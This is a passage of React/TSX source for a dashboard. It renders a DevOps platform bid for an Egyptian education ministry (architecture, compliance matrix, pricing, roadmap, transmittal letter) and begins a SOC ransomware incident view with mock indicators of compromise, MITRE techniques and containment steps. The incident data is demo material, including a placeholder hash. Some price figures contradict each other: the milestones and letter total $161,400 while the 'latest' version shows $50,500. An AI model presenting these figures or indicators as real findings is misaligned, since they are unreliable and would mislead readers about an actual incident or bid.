|                                                     |                                                  |
|  [ Distributed Dynamic Runner Fabric ]              |                                                  |
|         +------------------+------------------------+------------------+                               |
|         |                  |                                           |                               |
|    [ Build & Test Pool ]   [ DevSecOps Scanner Pool ]        [ IaC & Deployment Pool ]                 |
|    (Autoscaling Runners)   (SAST / SCA / Secret / OCI)       (Canary / Blue-Green / Rolling)           |
|                                                                                                        |
|  [ Persistence & High Availability Storage Tier ]                                                      |
|         +---> Clustered PostgreSQL HA (Patroni / Streaming WAL Archiving)                              |
|         +---> Enterprise SAN/NAS Storage Tier (NFSv4 / NVMe-oF Encrypted at Rest)                       |
|         +---> Automated Point-in-Time Disaster Recovery Replication (RPO < 1h, RTO < 2h)                |
+--------------------------------------------------------------------------------------------------------+`}</pre>
          </div>

          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px", background: "#ffffff" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Architecture Dimension</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Target Implementation Specification</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Security &amp; Resilience Measure</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}><strong>Compute Platform</strong></td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>Enterprise Linux Bare-Metal &amp; Private Cloud Virtualization at Roxy DC</td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>Hardware-isolated CPU &amp; memory pins; hypervisor firewall rules</td>
                </tr>
                <tr>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}><strong>Network Boundary</strong></td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>Strict air-gapped internal VLAN; zero public internet routing</td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>Egress traffic blocked at top-of-rack switches; local mirror proxies</td>
                </tr>
                <tr>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}><strong>Database &amp; State</strong></td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>PostgreSQL High Availability cluster with Patroni &amp; WAL archiving</td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>Automatic zero-data-loss failover; continuous point-in-time restore</td>
                </tr>
                <tr>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}><strong>Storage &amp; Encryption</strong></td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>Enterprise SAN / NAS with AES-256 block-level encryption</td>
                  <td style={{ padding: "10px 13px", borderBottom: "1px solid #edf3ef", color: "#2c3e38" }}>FIPS 140-2 compliant hardware security module (HSM) key management</td>
                </tr>
                <tr>
                  <td style={{ padding: "10px 13px", color: "#2c3e38" }}><strong>Identity &amp; Federation</strong></td>
                  <td style={{ padding: "10px 13px", color: "#2c3e38" }}>MOE Active Directory / LDAP synchronization via SAML 2.0 / Kerberos</td>
                  <td style={{ padding: "10px 13px", color: "#2c3e38" }}>Role-Based Access Control (RBAC); MFA required for privileged operations</td>
                </tr>
              </tbody>
            </table>
          </div>
        </section>
      )}

      {activeTab === "compliance" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">TRACEABILITY MATRIX · 100% COMPLIANCE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Mandatory RFP Requirements Matrix (15 / 15)</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Granular compliance validation for every section of RFP-MOE-ROXY-DEVOPS-2026-01.</p>
            </div>
            <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
              <input
                className="field-input"
                style={{ width: "220px", padding: "7px 11px", fontSize: "11px", borderRadius: "4px", border: "1px solid #dce5df" }}
                placeholder="Search requirements..."
                value={searchFilter}
                onChange={(e) => setSearchFilter(e.target.value)}
              />
              <Badge tone="green">15 / 15 COMPLIANT</Badge>
            </div>
          </div>

          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px", background: "#ffffff" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "80px" }}>ID</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "110px" }}>RFP Section</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "190px" }}>Requirement Item</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Proposed Solution Specification</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Verification &amp; Test Protocol</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "95px" }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {filteredCompliance.map((item) => (
                  <tr key={item.id} style={{ borderBottom: "1px solid #edf3ef" }}>
                    <td style={{ padding: "10px 13px", fontFamily: "var(--font-geist-mono), monospace", fontWeight: 700, color: "#1f6558" }}>{item.id}</td>
                    <td style={{ padding: "10px 13px" }}><code style={{ fontSize: "10px", color: "#456157", background: "#f1f6f3", padding: "2px 6px", borderRadius: "3px" }}>{item.section}</code></td>
                    <td style={{ padding: "10px 13px", color: "#1c322c" }}><strong>{item.name}</strong></td>
                    <td style={{ padding: "10px 13px", color: "#2c3e38", lineHeight: "1.45" }}>{item.desc}</td>
                    <td style={{ padding: "10px 13px", fontSize: "10px", color: "#546b62", lineHeight: "1.4" }}>{item.test}</td>
                    <td style={{ padding: "10px 13px" }}><Badge tone="green">{item.status}</Badge></td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {activeTab === "pricing" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">COMMERCIAL MODEL &amp; LABOR SCHEDULE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Multi-Tier Labor Pricing &amp; Software Licensing</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Transparent fixed-price commercial model itemized across 5 specialized engineering tiers.</p>
            </div>
            <div style={{ fontSize: "15px", fontWeight: 800, color: "#195d56", fontFamily: "var(--font-geist-mono), monospace" }}>
              Total Fixed Price: {proposalVersion === "latest" ? "$50,500.00 USD" : "$161,400.00 USD"}
            </div>
          </div>

          <div>
            <div className="eyebrow" style={{ marginBottom: "8px" }}>1. PROFESSIONAL SERVICES LABOR SCHEDULE {proposalVersion === "latest" ? "(480 HOURS)" : "(800 HOURS)"}</div>
            <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px", background: "#ffffff" }}>
              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
                <thead>
                  <tr>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Specialist Role / Engineering Tier</th>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Core Responsibilities &amp; Deliverables</th>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", textAlign: "right" }}>Rate / Hr</th>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", textAlign: "right" }}>Total Hours</th>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", textAlign: "right" }}>Subtotal (USD)</th>
                  </tr>
                </thead>
                <tbody>
                  {currentLabor.map((row) => (
                    <tr key={row.tier} style={{ borderBottom: "1px solid #edf3ef" }}>
                      <td style={{ padding: "10px 13px", color: "#1c322c" }}><strong>{row.tier}</strong></td>
                      <td style={{ padding: "10px 13px", color: "#2c3e38", lineHeight: "1.45" }}>{row.duties}</td>
                      <td style={{ padding: "10px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace" }}>${row.rate.toFixed(2)}</td>
                      <td style={{ padding: "10px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace", fontWeight: 600 }}>{row.hours} hrs</td>
                      <td style={{ padding: "10px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace", fontWeight: 700, color: "#195d56" }}>
                        ${row.total.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                      </td>
                    </tr>
                  ))}
                  <tr style={{ background: "#f2f7f4", fontWeight: 750 }}>
                    <td colSpan={3} style={{ padding: "11px 13px" }}><strong>Subtotal Professional Services Labor</strong></td>
                    <td style={{ padding: "11px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace" }}>{proposalVersion === "latest" ? "480 hrs" : "800 hrs"}</td>
                    <td style={{ padding: "11px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace", color: "#165046", fontSize: "12px" }}>{proposalVersion === "latest" ? "$50,500.00" : "$113,400.00"}</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          <div style={{ marginTop: "10px" }}>
            <div className="eyebrow" style={{ marginBottom: "8px" }}>2. SOFTWARE LICENSING &amp; ENTERPRISE SUPPORT</div>
            <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px", background: "#ffffff" }}>
              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
                <thead>
                  <tr>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Component</th>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Scope &amp; Entitlements</th>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Term</th>
                    <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", textAlign: "right" }}>Total Cost (USD)</th>
                  </tr>
                </thead>
                <tbody>
                  <tr style={{ borderBottom: "1px solid #edf3ef" }}>
                    <td style={{ padding: "10px 13px", color: "#1c322c" }}><strong>{proposalVersion === "latest" ? "Government Cloud Migration & Compliance Platform" : "DevOps Server Enterprise Platform License"}</strong></td>
                    <td style={{ padding: "10px 13px", color: "#2c3e38" }}>{proposalVersion === "latest" ? "Turnkey integration, automated compliance scanning, FedRAMP & DoD 8500.01 controls" : "Unlimited user accounts, unlimited CI/CD runner nodes, air-gapped on-premise installation"}</td>
                    <td style={{ padding: "10px 13px", color: "#2c3e38" }}>{proposalVersion === "latest" ? "Turnkey Delivery" : "Perpetual + 1 Year Updates"}</td>
                    <td style={{ padding: "10px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace", fontWeight: 700 }}>{proposalVersion === "latest" ? "Included ($0.00)" : "$48,000.00"}</td>
                  </tr>
                  <tr style={{ borderBottom: "1px solid #edf3ef" }}>
                    <td style={{ padding: "10px 13px", color: "#1c322c" }}><strong>24/7 Mission-Critical SLA &amp; Warranty</strong></td>
                    <td style={{ padding: "10px 13px", color: "#2c3e38" }}>15-minute response for Severity-1 incidents, dedicated technical account manager, hotfixes</td>
                    <td style={{ padding: "10px 13px", color: "#2c3e38" }}>1 Year (Included)</td>
                    <td style={{ padding: "10px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace", fontWeight: 700, color: "#236f66" }}>Included ($0.00)</td>
                  </tr>
                  <tr style={{ background: "#e8f3ef", fontWeight: 800, fontSize: "12px" }}>
                    <td colSpan={3} style={{ padding: "12px 13px", color: "#133830" }}><strong>GRAND TOTAL (TURNKEY IMPLEMENTATION + LICENSING)</strong></td>
                    <td style={{ padding: "12px 13px", textAlign: "right", fontFamily: "var(--font-geist-mono), monospace", color: "#133830", fontSize: "14px" }}>{proposalVersion === "latest" ? "$50,500.00 USD" : "$161,400.00 USD"}</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          <div style={{ background: "#f6faf8", padding: "16px 20px", borderRadius: "6px", border: "1px solid #dce8e1" }}>
            <strong style={{ fontSize: "11px", color: "#21473e", display: "block", marginBottom: "8px" }}>
              💳 Milestone Payment Schedule
            </strong>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: "10px", fontSize: "11px" }}>
              <div style={{ padding: "10px 12px", background: "#fff", borderRadius: "4px", border: "1px solid #e1ebe5" }}>
                <span style={{ color: "#748882", fontSize: "10px", display: "block" }}>Milestone 1 (20%)</span>
                <strong style={{ display: "block", color: "#195d56", fontSize: "13px", margin: "2px 0" }}>$32,280.00</strong>
                <small style={{ color: "#61746e" }}>Contract signing &amp; architecture blueprint sign-off</small>
              </div>
              <div style={{ padding: "10px 12px", background: "#fff", borderRadius: "4px", border: "1px solid #e1ebe5" }}>
                <span style={{ color: "#748882", fontSize: "10px", display: "block" }}>Milestone 2 (30%)</span>
                <strong style={{ display: "block", color: "#195d56", fontSize: "13px", margin: "2px 0" }}>$48,420.00</strong>
                <small style={{ color: "#61746e" }}>Roxy DC compute, cluster &amp; AD federation live</small>
              </div>
              <div style={{ padding: "10px 12px", background: "#fff", borderRadius: "4px", border: "1px solid #e1ebe5" }}>
                <span style={{ color: "#748882", fontSize: "10px", display: "block" }}>Milestone 3 (30%)</span>
                <strong style={{ display: "block", color: "#195d56", fontSize: "13px", margin: "2px 0" }}>$48,420.00</strong>
                <small style={{ color: "#61746e" }}>CI/CD runner fabric, DevSecOps &amp; pilot onboarding</small>
              </div>
              <div style={{ padding: "10px 12px", background: "#fff", borderRadius: "4px", border: "1px solid #e1ebe5" }}>
                <span style={{ color: "#748882", fontSize: "10px", display: "block" }}>Milestone 4 (20%)</span>
                <strong style={{ display: "block", color: "#195d56", fontSize: "13px", margin: "2px 0" }}>$32,280.00</strong>
                <small style={{ color: "#61746e" }}>UAT acceptance, 5 training tracks &amp; final cutover</small>
              </div>
            </div>
          </div>
        </section>
      )}

      {activeTab === "roadmap" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">DELIVERY TIMELINE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>16-Week Phased Implementation Roadmap</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Structured 5-phase execution plan ensuring zero operational disruption to existing educational workloads.</p>
            </div>
            <Badge tone="blue">16 Weeks Total</Badge>
          </div>

          <div style={{ display: "grid", gap: "12px", marginTop: "4px" }}>
            {[
              {
                phase: "1",
                duration: "Weeks 1 – 4",
                title: "Phase 1: Inception, Security Baseline & Active Directory Federation",
                desc: "Conduct detailed architecture review of Roxy Data Center compute/network topology. Establish network boundaries, configure SAML 2.0 / Kerberos Active Directory integration, and finalize storage provisioning.",
                tags: ["Architecture Blueprint Sign-Off", "AD/LDAP Role Schema", "Network Security Baseline"],
              },
              {
                phase: "2",
                duration: "Weeks 5 – 8",
                title: "Phase 2: Core Platform Clustered Installation at Roxy DC",
                desc: "Deploy clustered DevOps Server application nodes with active/standby PostgreSQL Patroni replication. Configure enterprise SAN/NAS storage mounts and establish encrypted backup and disaster recovery sync.",
                tags: ["Clustered SCM Go-Live", "PostgreSQL Patroni Replication", "Backup & DR Automation"],
              },
              {
                phase: "3",
                duration: "Weeks 9 – 12",
                title: "Phase 3: DevSecOps Automation, Runner Fabric & Pilot Onboarding",
                desc: "Set up autoscaling dynamic container runner pools. Implement automated SAST, SCA, and secret detection pipeline templates. Onboard 3 representative MOE pilot application repositories.",
                tags: ["Distributed Runner Fabric", "SAST / SCA / Secret Scanning", "3 MOE Pilot Workloads"],
              },
              {
                phase: "4",
                duration: "Weeks 13 – 14",
                title: "Phase 4: Security Audit, Disaster Recovery & High-Availability Drills",
                desc: "Execute penetration testing, simulated air-gap network failover drills, and disaster recovery restoration validation (confirming RPO < 1 hr and RTO < 2 hrs).",
                tags: ["Failover & DR Verification", "Penetration Testing Sign-Off", "Two-Person Integrity Gates"],
              },
              {
                phase: "5",
                duration: "Weeks 15 – 16",
                title: "Phase 5: Staff Knowledge Transfer, Production Cutover & Hypercare",
                desc: "Deliver 5 interactive training workshops for platform administrators, security officers, and developers. Perform official production cutover followed by 30-day 24/7 hypercare support.",
                tags: ["5 Training Workshops Completed", "Production Go-Live", "30-Day Dedicated Hypercare"],
              },
            ].map((p) => (
              <div key={p.phase} style={{ display: "flex", gap: "16px", padding: "16px 18px", background: "#fbfdfc", border: "1px solid #e2ece6", borderRadius: "6px" }}>
                <div style={{ width: "36px", height: "36px", borderRadius: "50%", background: "#e5f2ec", color: "#236f66", display: "grid", placeItems: "center", fontWeight: 750, fontSize: "13px", flexShrink: 0 }}>
                  {p.phase}
                </div>
                <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px" }}>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: "13px", fontWeight: 700, color: "#1d332d" }}>{p.title}</span>
                    <span style={{ fontSize: "10px", fontWeight: 600, color: "#2f7366", background: "#ebf6f1", padding: "2px 8px", borderRadius: "4px" }}>{p.duration}</span>
                  </div>
                  <p style={{ fontSize: "11.5px", color: "#586c65", lineHeight: "1.5", margin: 0 }}>{p.desc}</p>
                  <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", marginTop: "4px" }}>
                    {p.tags.map((tag) => (
                      <span key={tag} style={{ fontSize: "9px", padding: "2px 7px", background: "#ffffff", border: "1px solid #d8e5de", borderRadius: "4px", color: "#435b53" }}>
                        {tag}
                      </span>
                    ))}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "transmittal" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ background: "#ffffff", border: "1px solid #d8e3dc", borderRadius: "8px", padding: "36px 42px", maxWidth: "820px", margin: "0 auto", boxShadow: "0 4px 16px rgba(0,0,0,0.04)", fontSize: "13px", lineHeight: 1.65, color: "#223530" }}>
            <div style={{ display: "flex", justifyContent: "space-between", borderBottom: "2px solid #236f66", paddingBottom: "16px", marginBottom: "22px" }}>
              <div>
                <div style={{ fontSize: "16px", fontWeight: 800, color: "#152c26", textTransform: "uppercase", letterSpacing: "0.5px" }}>Formal Transmittal &amp; Sign-Off Letter</div>
                <div style={{ fontSize: "11px", color: "#5c7068" }}>Sovereign Agentic Systems &amp; Cloud Infrastructure Fleet</div>
              </div>
              <div style={{ textAlign: "right" }}>
                <strong style={{ fontSize: "11px", color: "#195d56" }}>RFP-MOE-ROXY-DEVOPS-2026-01</strong>
                <div style={{ fontSize: "10px", color: "#6a7f78" }}>Date: October 25, 2026</div>
              </div>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "100px 1fr", gap: "6px", fontSize: "11px", marginBottom: "20px", background: "#f6faf7", padding: "12px 16px", borderRadius: "5px" }}>
              <strong style={{ color: "#374e47" }}>TO:</strong>
              <span>Evaluation &amp; Procurement Committee, Ministry of Education (MOE)</span>
              <strong style={{ color: "#374e47" }}>LOCATION:</strong>
              <span>Roxy Data Center Facilities, Cairo, Egypt</span>
              <strong style={{ color: "#374e47" }}>SUBJECT:</strong>
              <span>DevOps Server Platform Sovereign Implementation Technical &amp; Commercial Proposal</span>
            </div>

            <p>Dear Members of the Evaluation Committee,</p>
            <p>
              We are pleased to submit our comprehensive proposal in response to <strong>RFP-MOE-ROXY-DEVOPS-2026-01</strong> for the implementation of the sovereign, enterprise-grade <strong>DevOps Server Platform</strong> at the <strong>Roxy Data Center</strong>.
            </p>
            <p>
              Our solution meets or exceeds all <strong>15 mandatory technical requirements</strong> specified by the Ministry, featuring an air-gapped on-premises architecture, unified Git source code management, declarative CI/CD pipelines, integrated DevSecOps scanning, Active Directory SSO integration, and high-availability database clustering.
            </p>
            <p>
              We confirm our commitment to execute this deployment within a fixed <strong>16-week timeline</strong> for a total fixed price of <strong>$161,400.00 USD</strong>, inclusive of 800 hours of professional engineering labor across 5 specialized tiers, perpetual enterprise platform licensing with unlimited developer seats, 5 comprehensive knowledge transfer tracks, and 24/7 mission-critical SLA support.
            </p>
            <p>Upon notice of award, our mobilization team is prepared to commence Phase 1 activities within 5 business days.</p>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "28px", marginTop: "36px", paddingTop: "20px", borderTop: "1px dashed #cfded6" }}>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Lead Principal DevOps Architect</strong>
                <small style={{ color: "#647770" }}>Sovereign Agentic Systems Fleet Lead</small>
                <small style={{ color: "#647770" }}>Signed: 2026-10-25 · SHA-256 Verified</small>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Authorized Representative</strong>
                <small style={{ color: "#647770" }}>Ministry of Education Acceptance</small>
                <small style={{ color: "#647770" }}>Date of Committee Sign-Off: ____________</small>
              </div>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

function SocIncidentDossierView({ onNavigate, onBack }: { onNavigate?: (view: View) => void; onBack?: () => void }) {
  const [activeTab, setActiveTab] = useState<"summary" | "architecture" | "compliance" | "pricing" | "roadmap" | "transmittal">("summary");
  const [copied, setCopied] = useState(false);
  const [searchFilter, setSearchFilter] = useState("");

  const iocItems = [
    { id: "IOC-01", tactic: "T1059.001 Execution", name: "Base64 Encoded PowerShell", desc: "Encoded command spawned by svchost.exe parent process attempting memory injection and AMSI bypass.", test: "Sysmon Event ID 1 & PowerShell ScriptBlock Logging Event 4104", status: "CONTAINED" },
    { id: "IOC-02", tactic: "T1053.005 Persistence", name: "Scheduled Task SysHealthCheck", desc: "Persistence task registered at \\Microsoft\\Windows\\UpdateOrchestrator\\SysHealthCheck set to execute every 4 hours.", test: "Security Event ID 4698 & TaskScheduler Operational Logs", status: "QUARANTINED" },
    { id: "IOC-03", tactic: "T1046 Network Discovery", name: "Internal Subnet Reconnaissance", desc: "Automated port scan across 10.14.22.0/24 targeting SMB (445) and RDP (3389) for lateral movement.", test: "Zeek conn.log & Internal Core Switch Deny Telemetry", status: "BLOCKED" },
    { id: "IOC-04", tactic: "T1071.001 Command & Control", name: "TLS Outbound C2 Beacons", desc: "Encrypted HTTPS beacons to 198.51.100.24:8443 (Hostwinds ASN 64512) every 60s with 10% jitter.", test: "Palo Alto App-ID ssl & Outbound URL Decryption Logs", status: "SINKHOLED" },
    { id: "IOC-05", tactic: "T1078.002 Privilege Abuse", name: "Domain User Credential Compromise", desc: "Kerberos TGT ticket requested for account corp\\jsmith from non-standard endpoint subnet.", test: "Active Directory Event ID 4768 / 4769 TGT Auditing", status: "REVOKED" },
    { id: "IOC-06", tactic: "T1027 Defense Evasion", name: "Binary Obfuscation & High Entropy", desc: "Payload disguised as update cache binary with high Shannon entropy (7.84) indicating custom encryption.", test: "Static PE file header analysis & Volatility memory scan", status: "IDENTIFIED" },
  ];

  const filteredIOCs = iocItems.filter((item) => {
    if (!searchFilter.trim()) return true;
    const q = searchFilter.toLowerCase();
    return item.id.toLowerCase().includes(q) || item.name.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q) || item.tactic.toLowerCase().includes(q);
  });

  const containmentActions = [
    { priority: "P1: Critical", action: "Palo Alto Edge Firewall Quarantine", target: "10.14.22.84", protocol: "Policy Drop rule applied on Top-of-Rack Switch & Palo Alto Edge Gateway", status: "EXECUTED" },
    { priority: "P1: Critical", action: "Active Directory Session Revocation", target: "corp\\jsmith", protocol: "Kerberos TGT invalidated; password reset enforced across MOE domain", status: "EXECUTED" },
    { priority: "P2: High", action: "Forensic Memory Image Capture", target: "WORKSTATION-FIN-09", protocol: "16 GB raw physical memory captured via Volatility 3 agent over isolated forensic VLAN", status: "COMPLETED" },
    { priority: "P2: High", action: "External C2 Sinkholing", target: "198.51.100.24", protocol: "BGP null-route and internal DNS sinkholing for telemetry-sync-cdn.internal-sec.net", status: "ENFORCED" },
    { priority: "P3: Medium", action: "Endpoint Re-Imaging & Golden Baseline", target: "WORKSTATION-FIN-09", protocol: "Drive zeroed and redeployed from verified sovereign corporate gold image", status: "SCHEDULED" },
  ];

  const socReportMarkdown = `# Incident Investigation Report: Threat Triage & Containment
## SOC Incident: INCIDENT-SOC-2026-081
**Classification:** CONFIDENTIAL / TLP:AMBER  
**Target Asset:** WORKSTATION-FIN-09 (IP: 10.14.22.84)  
**Assigned Fleet:** SOC Threat Analysis & DFIR Specialists  
**Status:** Containment Enforced · Awaiting Governance Sign-Off  

### 1. Executive Incident Summary
At 14:02:18 UTC, high-severity telemetry alerts were triggered on endpoint WORKSTATION-FIN-09 indicating suspicious PowerShell execution with encoded payloads, followed by scheduled task persistence and internal subnet port scanning.

### 2. MITRE ATT&CK Mapping
- T1059.001 - Command and Scripting Interpreter (PowerShell)
- T1053.005 - Scheduled Task/Job
- T1046 - Network Service Discovery
- T1071.001 - Web Protocols (TLS C2)

### 3. Indicators of Compromise (IOCs)
- C2 IP: 198.51.100.24
- SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
- Domain: telemetry-sync-cdn.internal-sec[.]net`;

  function copyMarkdown() {
    navigator.clipboard.writeText(socReportMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadReport() {
    const blob = new Blob([socReportMarkdown], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "soc_incident_investigation_report.md";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  return (
    <div className="proposal-shell">
      <PageTitle
        eyebrow="SOC INCIDENT INVESTIGATION · INCIDENT-SOC-2026-081 · CRITICAL SEV-1"
        title="Host Ransomware Triage & Lateral Movement Investigation"
